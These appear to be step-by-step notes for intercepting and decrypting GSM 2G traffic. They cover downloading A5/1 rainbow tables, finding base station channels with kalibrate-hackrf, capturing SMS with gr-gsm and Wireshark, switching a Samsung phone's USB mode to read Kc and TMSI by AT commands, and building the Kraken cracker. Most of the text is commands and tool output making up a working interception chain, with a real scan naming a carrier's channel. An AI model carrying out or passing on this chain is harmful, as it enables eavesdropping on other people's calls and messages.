1. First Get the Rainbow table from  https://archive.org/download/A51_rainbow_tables
2. Follow this playlist tutorial https://www.youtube.com/watch?v=UKmpw4gcMSE&list=PLRovDyowOn5F_TFotx0n8A79ToZYD2lOv&index=13

3. Get Dragon OS, Do not upgrade.

4. Get Kalibrate-Hackrf from
```
git clone https://github.com/scateu/kalibrate-hackrf
cd kalibrate-hackrf/
./bootstrap && CXXFLAGS='-W -Wall -O3' ./configure && make
sudo make install
```
5. on the kalibrate Hackrf Folder Go to and run
```
./src/kal -s 900


https://www.cellmapper.net/arfcn?net=GSM&ARFCN=21&MCC=0

```
7. You will get result like this

  ________________________________________________________________
```
`GSM-900:
        chan:   14 (937.8MHz + 497Hz)   power: 3209753.01
        chan:   15 (938.0MHz - 15.251kHz)       power: 3562031.89
        chan:   17 (938.4MHz + 33.406kHz)       power: 3631207.61
        chan:   18 (938.6MHz + 34.154kHz)       power: 3800253.43
        chan:   19 (938.8MHz + 15.328kHz)       power: 3812325.19
        chan:   20 (939.0MHz - 26.275kHz)       power: 4266365.83      //Teletalk 2G 939.2
        chan:   24 (939.8MHz + 23.846kHz)       power: 5056018.06
        chan:   25 (940.0MHz + 5.517kHz)        power: 4851968.94
        chan:   26 (940.2MHz + 10.914kHz)       power: 4230893.41
        chan:   27 (940.4MHz - 11.936kHz)       power: 4534314.20
        chan:   43 (943.6MHz + 27.547kHz)       power: 4269051.45
        chan:   44 (943.8MHz + 32.677kHz)       power: 4810345.02
        chan:   45 (944.0MHz - 1.136kHz)        power: 4376724.47
        chan:   46 (944.2MHz + 37.652kHz)       power: 4468794.08
        chan:   47 (944.4MHz - 9.425kHz)        power: 4707912.19
        chan:   48 (944.6MHz - 24.230kHz)       power: 4605801.69
        chan:   69 (948.8MHz - 18.314kHz)       power: 4245432.34
        chan:   81 (951.2MHz + 31.983kHz)       power: 5672801.75
        chan:   82 (951.4MHz + 12.784kHz)       power: 5684655.94
        chan:   83 (951.6MHz + 11.307kHz)       power: 5625388.05
        chan:   84 (951.8MHz - 38.226kHz)       power: 5820237.75
        chan:   85 (952.0MHz - 13.828kHz)       power: 5994576.16
        chan:   93 (953.6MHz + 11.803kHz)       power: 4164758.36
        chan:   94 (953.8MHz - 186Hz)   power: 4293292.98
        chan:   95 (954.0MHz - 37.322kHz)       power: 4346337.10
        chan:   99 (954.8MHz + 26.089kHz)       power: 5505476.68
        chan:  100 (955.0MHz + 4.738kHz)        power: 5212722.30
        chan:  101 (955.2MHz + 5.860kHz)        power: 5112706.06
        chan:  102 (955.4MHz - 26.203kHz)       power: 5490840.09
        chan:  103 (955.6MHz - 39.829kHz)       power: 4713298.91
        chan:  104 (955.8MHz - 11.680kHz)       power: 5195763.87
        chan:  110 (957.0MHz + 27.657kHz)       power: 4629499.81
        chan:  111 (957.2MHz + 3.338kHz)        power: 3406185.15
        chan:  112 (957.4MHz + 1.996kHz)        power: 3105951.65
        chan:  113 (957.6MHz - 34.137kHz)       power: 3212087.06
```  
________________________________________________________________


To use GR GSM
Open sudo wireshark
and select loopback
``` 
grgsm_livemon


Capturing SMS
KC

TMSI

ARFCN
21

Downlink
939.2

```
We need LAPDm (not gsmtap from wireshark)


https://github.com/ud2/advisories/blob/master/android/samsung/nocve-2016-0004/usbswitcher.c

7. To install Usbswitcher you need to install
```
sudo apt get install libusb-dev ```   (libusb 0.1)
https://github.com/ud2/advisories/tree/master/android/samsung/nocve-2016-0004
https://github.com/libusb/libusb
```
gcc -o usbswitcher usbswitcher.c -lusb
sudo ./usbswitcher -s
```

Usb switcher can change certain MTP mobiles to 2nd configuration where you can use AT commands to read the SIMs (Kc & TMSI).
on Mobile phone
```
cat /proc/tty/drivers
```
will show Serial/USB drivers
On PC
```
lsusb -v|less
```
This command will show something like this.
bNumConfigurations 2 will be required to switch to usb switcher to swtich to 2nd configuration.

________________________________________________________________
```
Bus 001 Device 005: ID 04e8:6860 Samsung Electronics Co., Ltd Galaxy A5 (MTP)
Device Descriptor:
  bLength                18
  bDescriptorType         1
  bcdUSB               2.10
  bDeviceClass            0 
  bDeviceSubClass         0 
  bDeviceProtocol         0 
  bMaxPacketSize0        64
  idVendor           0x04e8 Samsung Electronics Co., Ltd
  idProduct          0x6860 Galaxy A5 (MTP)
  bcdDevice            c.00
  iManufacturer           7 SAMSUNG
  iProduct                8 SAMSUNG_Android
  iSerial                 9 RZCT80PTHLX
  bNumConfigurations      1
  Configuration Descriptor:
    bLength                 9
    bDescriptorType         2
    wTotalLength       0x009f
    bNumInterfaces          5
    bConfigurationValue     1
    iConfiguration          0 
    bmAttributes         0x80
      (Bus Powered)
    MaxPower              500mA
    Interface Descriptor:
      bLength                 9
      bDescriptorType         4
      bInterfaceNumber        0
      bAlternateSetting       0
      bNumEndpoints           3
      bInterfaceClass         6 Imaging
      bInterfaceSubClass      1 Still Image Capture
      bInterfaceProtocol      1 Picture Transfer Protocol (PIMA 15470)
      iInterface             11 MTP
      Endpoint Descriptor:
        bLength                 7
        bDescriptorType         5
        bEndpointAddress     0x81  EP 1 IN
        bmAttributes            2
          Transfer Type            Bulk
          Synch Type               None
          Usage Type               Data
        wMaxPacketSize     0x0200  1x 512 bytes
        bInterval               0
      Endpoint Descriptor:
        bLength                 7
        bDescriptorType         5
        bEndpointAddress     0x01  EP 1 OUT
        bmAttributes            2
          Transfer Type            Bulk
          Synch Type               None
          Usage Type               Data
        wMaxPacketSize     0x0200  1x 512 bytes
        bInterval               0
      Endpoint Descriptor:
        bLength                 7
        bDescriptorType         5
        bEndpointAddress     0x82  EP 2 IN
        bmAttributes            3
          Transfer Type            Interrupt
          Synch Type               None
          Usage Type               Data
        wMaxPacketSize     0x001c  1x 28 bytes
        bInterval               6
    Interface Association:
      bLength                 8
      bDescriptorType        11
      bFirstInterface         1
      bInterfaceCount         2
      bFunctionClass          2 Communications
      bFunctionSubClass       2 Abstract (modem)
      bFunctionProtocol       1 AT-commands (v.25ter)
      iFunction               8 SAMSUNG_Android
    Interface Descriptor:
      bLength                 9
      bDescriptorType         4
      bInterfaceNumber        1
      bAlternateSetting       0
      bNumEndpoints           1
      bInterfaceClass         2 Communications
      bInterfaceSubClass      2 Abstract (modem)
      bInterfaceProtocol      1 AT-commands (v.25ter)
      iInterface              6 CDC Abstract Control Model (ACM)
      CDC Header:
        bcdCDC               1.10
      CDC Call Management:
        bmCapabilities       0x00
        bDataInterface          2
      CDC ACM:
        bmCapabilities       0x02
          line coding and serial state
      CDC Union:
        bMasterInterface        1
        bSlaveInterface         2 
      Endpoint Descriptor:
        bLength                 7
        bDescriptorType         5
        bEndpointAddress     0x84  EP 4 IN
        bmAttributes            3
          Transfer Type            Interrupt
          Synch Type               None
          Usage Type               Data
        wMaxPacketSize     0x000a  1x 10 bytes
        bInterval               9
    Interface Descriptor:
      bLength                 9
      bDescriptorType         4
      bInterfaceNumber        2
      bAlternateSetting       0
      bNumEndpoints           2
      bInterfaceClass        10 CDC Data
      bInterfaceSubClass      0 
      bInterfaceProtocol      0 
      iInterface              7 SAMSUNG
      Endpoint Descriptor:
        bLength                 7
        bDescriptorType         5
        bEndpointAddress     0x83  EP 3 IN
        bmAttributes            2
          Transfer Type            Bulk
          Synch Type               None
          Usage Type               Data
        wMaxPacketSize     0x0200  1x 512 bytes
        bInterval               0
      Endpoint Descriptor:
        bLength                 7
        bDescriptorType         5
        bEndpointAddress     0x02  EP 2 OUT
        bmAttributes            2
          Transfer Type            Bulk
          Synch Type               None
          Usage Type               Data
        wMaxPacketSize     0x0200  1x 512 bytes
        bInterval               0
    Interface Descriptor:
      bLength                 9
      bDescriptorType         4
      bInterfaceNumber        3
      bAlternateSetting       0
      bNumEndpoints           2
      bInterfaceClass       255 Vendor Specific Class
      bInterfaceSubClass     64 
      bInterfaceProtocol      2 
      iInterface              0 
      Endpoint Descriptor:
        bLength                 7
        bDescriptorType         5
        bEndpointAddress     0x85  EP 5 IN
        bmAttributes            2
          Transfer Type            Bulk
          Synch Type               None
          Usage Type               Data
        wMaxPacketSize     0x0200  1x 512 bytes
        bInterval               0
      Endpoint Descriptor:
        bLength                 7
        bDescriptorType         5
        bEndpointAddress     0x03  EP 3 OUT
        bmAttributes            2
          Transfer Type            Bulk
          Synch Type               None
          Usage Type               Data
        wMaxPacketSize     0x0200  1x 512 bytes
        bInterval               0
    Interface Descriptor:
      bLength                 9
      bDescriptorType         4
      bInterfaceNumber        4
      bAlternateSetting       0
      bNumEndpoints           2
      bInterfaceClass       255 Vendor Specific Class
      bInterfaceSubClass     66 
      bInterfaceProtocol      1 
      iInterface             12 ADB Interface
      Endpoint Descriptor:
        bLength                 7
        bDescriptorType         5
        bEndpointAddress     0x04  EP 4 OUT
        bmAttributes            2
          Transfer Type            Bulk
          Synch Type               None
          Usage Type               Data
        wMaxPacketSize     0x0200  1x 512 bytes
        bInterval               0
      Endpoint Descriptor:
        bLength                 7
        bDescriptorType         5
        bEndpointAddress     0x86  EP 6 IN
        bmAttributes            2
          Transfer Type            Bulk
          Synch Type               None
          Usage Type               Data
        wMaxPacketSize     0x0200  1x 512 bytes
        bInterval               0
        INTERFACE CLASS:  08 24 80 0c 00 01 00 01
Binary Object Store Descriptor:
  bLength                 5
  bDescriptorType        15
  wTotalLength       0x0016
  bNumDeviceCaps          2
  USB 2.0 Extension Device Capability:
    bLength                 7
    bDescriptorType        16
    bDevCapabilityType      2
    bmAttributes   0x00000006
      BESL Link Power Management (LPM) Supported
  SuperSpeed USB Device Capability:
    bLength                10
    bDescriptorType        16
    bDevCapabilityType      3
    bmAttributes         0x00
    wSpeedsSupported   0x000f
      Device can operate at Low Speed (1Mbps)
      Device can operate at Full Speed (12Mbps)
      Device can operate at High Speed (480Mbps)
      Device can operate at SuperSpeed (5Gbps)
    bFunctionalitySupport   1
      Lowest fully-functional device speed is Full Speed (12Mbps)
    bU1DevExitLat           1 micro seconds
    bU2DevExitLat         500 micro seconds
Device Status:     0x0000
  (Bus Powered)

```
  
  ________________________________________________________________
  
  
  
8. To install Kraken
```

git clone https://github.com/joswr1ght/kraken

cd kraken/
```

Change all CPP files to compile this
```

It should be sufficient to replace the <stropts.h> inclusion with <sys/ioctl.h>```
cd to /kraken/
```
sudo make noati

cd a5_cpu/

./a5cpu_test 

cd ..

cd indexes/
```
change sample index to index.conf
  ________________________________________________________________
  ```
#Devices:  dev/node max_tables
Device: /dev/sdc2 40

#Tables: dev id(advance) offset
  ```
  ________________________________________________________________
 /dev/sdc2 is 2TB and formatted to ext4.
 it will be raw file system after indexed.

```
cp tables.conf.sample tables.conf

sudo python2 ./Behemoth.py /media/nm/backup01/A51/table
```

"/" is sensitive.

it will take 2/3 hour to copy all 1.6TB to that drive
```
cat tables.conf
```

To Run Kraken
```
cd kraken/Kraken/
sudo ./kraken  ../indexes/
```
